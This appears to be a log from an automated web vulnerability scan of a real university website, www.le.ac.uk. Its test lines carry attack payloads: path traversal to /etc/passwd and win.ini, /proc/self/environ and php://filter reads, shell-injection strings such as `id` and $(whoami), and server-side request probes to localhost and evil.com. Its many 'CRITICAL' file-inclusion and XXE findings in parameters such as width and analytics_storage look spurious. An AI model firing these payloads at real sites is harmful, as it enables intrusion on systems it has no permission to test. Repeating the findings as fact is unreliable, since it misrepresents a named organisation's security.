+[04:11:57] [DEBUG] Test failed for contentUrl=1: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:11:57] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'username'
+[04:11:57] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?username=...
+[04:11:57] [DEBUG] Test failed for item=; ls: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:00] [DEBUG] Test failed for hash=admin: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:02] [DEBUG] Test failed for url=http://[::1]:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:03] [DEBUG] Test failed for addressCountry=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:03] [DEBUG] Test failed for level=http://127.0.0.1:22: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:04] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'analytics_storage'
+[04:12:04] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?analytics_storage=...
+[04:12:05] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'streetAddress'
+[04:12:05] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?streetAddress=...
+[04:12:06] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'username'
+[04:12:06] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?username=...
+[04:12:07] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'analytics_storage'
+[04:12:07] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?analytics_storage=...
+[04:12:08] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'analytics_storage'
+[04:12:08] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?analytics_storage=...
+[04:12:09] [DEBUG] Test failed for ch=../../../etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:09] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'user'
+[04:12:09] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?user=...
+[04:12:09] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'analytics_storage'
+[04:12:09] [INFO] Found XML External Entity at https://www.le.ac.uk?analytics_storage=...
+[04:12:10] [DEBUG] Test failed for height=/proc/self/environ: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:11] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'postalCode'
+[04:12:11] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?postalCode=...
+[04:12:11] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'height'
+[04:12:11] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?height=...
+[04:12:11] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'postalCode'
+[04:12:11] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?postalCode=...
+[04:12:12] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'height'
+[04:12:12] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?height=...
+[04:12:12] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'postalCode'
+[04:12:12] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?postalCode=...
+[04:12:13] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'width'
+[04:12:13] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?width=...
+[04:12:13] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'analytics_storage'
+[04:12:13] [INFO] Found XML External Entity at https://www.le.ac.uk?analytics_storage=...
+[04:12:14] [DEBUG] Test failed for item=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:14] [DEBUG] Test failed for datePublished=..\..\..\windows\win.ini: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:14] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'analytics_storage'
+[04:12:14] [INFO] Found XML External Entity at https://www.le.ac.uk?analytics_storage=...
+[04:12:15] [DEBUG] Test failed for addressLocality=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:15] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_storage'
+[04:12:15] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_storage=...
+[04:12:17] [DEBUG] Test failed for url=1: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:17] [DEBUG] Test failed for name=admin: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:18] [DEBUG] Test failed for cw=../../../etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:18] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'ad_user_data'
+[04:12:18] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?ad_user_data=...
+[04:12:18] [DEBUG] Test failed for addressCountry=$(whoami): The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:18] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'width'
+[04:12:18] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?width=...
+[04:12:19] [DEBUG] Test failed for level=http://[::1]:80: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:19] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cx'
+[04:12:19] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cx=...
+[04:12:19] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'user'
+[04:12:19] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?user=...
+[04:12:20] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cx'
+[04:12:20] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cx=...
+[04:12:20] [DEBUG] Test failed for streetAddress=....//....//....//etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:21] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'streetAddress'
+[04:12:21] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?streetAddress=...
+[04:12:21] [DEBUG] Test failed for hash=| dir: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:21] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'width'
+[04:12:21] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?width=...
+[04:12:21] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'datePublished'
+[04:12:21] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?datePublished=...
+[04:12:22] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'datePublished'
+[04:12:22] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'id'
+[04:12:22] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?id=...
+[04:12:22] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?datePublished=...
+[04:12:25] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'streetAddress'
+[04:12:25] [INFO] Found XML External Entity at https://www.le.ac.uk?streetAddress=...
+[04:12:25] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_storage'
+[04:12:25] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_storage=...
+[04:12:26] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressCountry'
+[04:12:26] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressCountry=...
+[04:12:27] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'id'
+[04:12:27] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?id=...
+[04:12:27] [DEBUG] Test failed for ad_personalization=../../../etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:27] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_storage'
+[04:12:27] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_storage=...
+[04:12:27] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressCountry'
+[04:12:27] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressCountry=...
+[04:12:27] [DEBUG] Test failed for height=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:27] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressLocality'
+[04:12:27] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressLocality=...
+[04:12:27] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressCountry'
+[04:12:27] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressCountry=...
+[04:12:28] [INFO] [HIGH] Insecure Direct Object Reference: Insecure Direct Object Reference in parameter 'id'
+[04:12:28] [INFO] Found Insecure Direct Object Reference at https://www.le.ac.uk?id=...
+[04:12:28] [DEBUG] Test failed for contentUrl=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:28] [DEBUG] Test failed for sameAs=/proc/self/environ: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:28] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressLocality'
+[04:12:28] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressLocality=...
+[04:12:28] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'addressLocality'
+[04:12:28] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?addressLocality=...
+[04:12:28] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'sameAs'
+[04:12:29] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?sameAs=...
+[04:12:29] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'ad_storage'
+[04:12:29] [INFO] Found XML External Entity at https://www.le.ac.uk?ad_storage=...
+[04:12:29] [DEBUG] Test failed for ch=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:29] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'sameAs'
+[04:12:29] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?sameAs=...
+[04:12:29] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'sameAs'
+[04:12:29] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?sameAs=...
+[04:12:30] [DEBUG] Test failed for analytics_storage=https://evil.com: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:30] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'ad_storage'
+[04:12:30] [INFO] Found XML External Entity at https://www.le.ac.uk?ad_storage=...
+[04:12:30] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ch'
+[04:12:30] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ch=...
+[04:12:31] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cy'
+[04:12:31] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cy=...
+[04:12:32] [DEBUG] Test failed for dateModified=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:33] [DEBUG] Test failed for postalCode=php://filter/convert.base64-encode/resource=index.php: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:33] [DEBUG] Test failed for url=100: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:33] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'width'
+[04:12:33] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?width=...
+[04:12:33] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'hash'
+[04:12:33] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?hash=...
+[04:12:34] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ch'
+[04:12:34] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ch=...
+[04:12:34] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'hash'
+[04:12:34] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?hash=...
+[04:12:34] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cy'
+[04:12:34] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cy=...
+[04:12:34] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cy'
+[04:12:34] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cy=...
+[04:12:35] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'dateModified'
+[04:12:35] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?dateModified=...
+[04:12:35] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'description'
+[04:12:35] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?description=...
+[04:12:35] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'dateModified'
+[04:12:35] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?dateModified=...
+[04:12:35] [DEBUG] Test failed for user=test: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:36] [DEBUG] Test failed for cx=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'description'
+[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'dateModified'
+[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?dateModified=...
+[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?description=...
+[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_personalization'
+[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_personalization=...
+[04:12:36] [DEBUG] Test failed for cw=/proc/self/environ: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'description'
+[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?description=...
+[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_personalization'
+[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_personalization=...
+[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'item'
+[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?item=...
+[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'width'
+[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?width=...
+[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cw'
+[04:12:36] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cw=...
+[04:12:36] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'address'
+[04:12:37] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?address=...
+[04:12:37] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_personalization'
+[04:12:37] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_personalization=...
+[04:12:37] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cw'
+[04:12:37] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cw=...
+[04:12:37] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'width'
+[04:12:37] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?width=...
+[04:12:37] [DEBUG] Test failed for username=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:37] [DEBUG] Test failed for datePublished=file:///etc/passwd: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:38] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'item'
+[04:12:38] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?item=...
+[04:12:39] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'item'
+[04:12:39] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?item=...
+[04:12:40] [DEBUG] Test failed for level=`id`: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:40] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'sameAs'
+[04:12:40] [INFO] Found XML External Entity at https://www.le.ac.uk?sameAs=...
+[04:12:40] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'cy'
+[04:12:40] [INFO] Found XML External Entity at https://www.le.ac.uk?cy=...
+[04:12:41] [DEBUG] Test failed for name=| dir: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:41] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_user_data'
+[04:12:41] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_user_data=...
+[04:12:41] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_user_data'
+[04:12:41] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_user_data=...
+[04:12:41] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'width'
+[04:12:41] [INFO] Found XML External Entity at https://www.le.ac.uk?width=...
+[04:12:42] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'ad_user_data'
+[04:12:42] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?ad_user_data=...
+[04:12:42] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'width'
+[04:12:42] [INFO] Found XML External Entity at https://www.le.ac.uk?width=...
+[04:12:43] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'ad_personalization'
+[04:12:43] [INFO] Found XML External Entity at https://www.le.ac.uk?ad_personalization=...
+[04:12:43] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'cy'
+[04:12:43] [INFO] Found XML External Entity at https://www.le.ac.uk?cy=...
+[04:12:43] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'contentUrl'
+[04:12:43] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?contentUrl=...
+[04:12:43] [INFO] [CRITICAL] XML External Entity: XML External Entity in parameter 'dateModified'
+[04:12:43] [INFO] Found XML External Entity at https://www.le.ac.uk?dateModified=...
+[04:12:44] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'contentUrl'
+[04:12:44] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?contentUrl=...
+[04:12:44] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'contentUrl'
+[04:12:44] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?contentUrl=...
+[04:12:45] [DEBUG] Test failed for addressRegion=..\..\..\windows\win.ini: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
+[04:12:45] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'cw'
+[04:12:45] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?cw=...
+[04:12:46] [INFO] [CRITICAL] Local/Remote File Inclusion: Local/Remote File Inclusion in parameter 'level'
+[04:12:46] [INFO] Found Local/Remote File Inclusion at https://www.le.ac.uk?level=...
+[04:12:46] [DEBUG] Test failed for addressCountry=php://filter/convert.base64-encode/resource=index.php: The request was canceled due to the configured HttpClient.Timeout of 15 seconds elapsing.
